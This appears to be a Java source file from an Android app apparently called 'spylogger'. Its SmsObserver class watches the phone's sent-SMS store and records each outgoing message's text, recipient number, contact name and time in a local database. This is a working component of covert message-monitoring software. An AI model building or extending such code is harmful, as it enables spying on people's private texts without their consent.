package com.gravatasufoca.spylogger.observers;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.gravatasufoca.spylogger.utils.Utils;

import java.sql.SQLException;
import java.util.Date;

public class SmsObserver extends ContentObserver {

    private Context mContext;

    private String contactId = "", contactName = "",last="";
    private String smsBodyStr = "", phoneNoStr = "",id="";
    private long smsDatTime = System.currentTimeMillis();
    static final Uri SMS_STATUS_URI = Uri.parse("content://sms/sent");

    public SmsObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
    }

    public boolean deliverSelfNotifications() {
        return true;
    }


    public void onChange(boolean selfChange) {
        try{
            Log.e("Info","Notification on SMS observer");
            Cursor sms_sent_cursor = mContext.getContentResolver().query(SMS_STATUS_URI, null, null, null, null);
            if (sms_sent_cursor != null) {
                if (sms_sent_cursor.moveToFirst()) {
                    String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
                    Log.e("Info","protocol : " + protocol);
                    //for send  protocol is null
                    int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
                    Log.e("Info","SMS Type : " + type);
                    // for actual state type=2
                    if(type == 2 ){

                       /* Log.e("Info","Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("_id")));
                        Log.e("Info","Thread Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("thread_id")));
                        Log.e("Info","Address : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
                        Log.e("Info","Person : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("person")));
                        Log.e("Info","Date : " + data);
                        Log.e("Info","Read : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("read")));
                        Log.e("Info","Status : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("status")));
                        Log.e("Info","Type : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("type")));
                        Log.e("Info","Rep Path Present : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("reply_path_present")));
                        Log.e("Info","Subject : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("subject")));
                        Log.e("Info","Body : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));
                        Log.e("Info","Err Code : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("error_code")));
                        */
                        smsBodyStr = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")).trim();
                        phoneNoStr = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")).trim();
                        smsDatTime = sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"));
                        id = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("_id"));

                        Log.e("Info","SMS Content : "+smsBodyStr);
                        Log.e("Info","SMS Phone No : "+phoneNoStr);
                        Log.e("Info","SMS Time : "+smsDatTime);
                        if(checkMessagem(phoneNoStr+smsBodyStr)) {
                            Mensagem mensagem = new Mensagem.MensagemBuilder()
                                    .setData(new Date(smsDatTime))
                                    .setTexto(smsBodyStr)
                                    .setContato(Utils.getContactDisplayNameByNumber(phoneNoStr, mContext.getContentResolver()))
                                    .setRemetente(false)
                                    .setDataRecebida(new Date())
                                    .setIdReferencia(id)
                                    .setTipoMidia(TipoMidia.TEXTO)
                                    .build(TipoMensagem.SMS);


                            try {
                                RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(mContext);
                                RepositorioTopico repositorioTopico = new RepositorioTopicoImpl(mContext);

                                Topico topico = repositorioTopico.findByName(mensagem.getContato());
                                if (topico == null) {
                                    topico = new Topico.TopicoBuilder()
                                            .setNome(mensagem.getContato())
                                            .setIdReferencia(mensagem.getIdReferencia())
                                            .build();

                                    repositorioTopico.inserir(topico);
                                }
                                mensagem.setTopico(topico);
                                repositorioMensagem.inserir(mensagem);

                            } catch (SQLException e) {
                                Log.e("ERRO AO ENVIAR", e.getLocalizedMessage());
                            }
                        }
                    }
                }
            }
            else
                Log.e("Info","Send Cursor is Empty");
        }
        catch(Exception sggh){
            Log.e("Error", "Error on onChange : "+sggh.toString());
        }
        super.onChange(selfChange);
    }
    private boolean checkMessagem(String msg){
        if(msg.equals(last))
            return false;
        last=msg;
        return true;
    }

}//End of class SmsObserver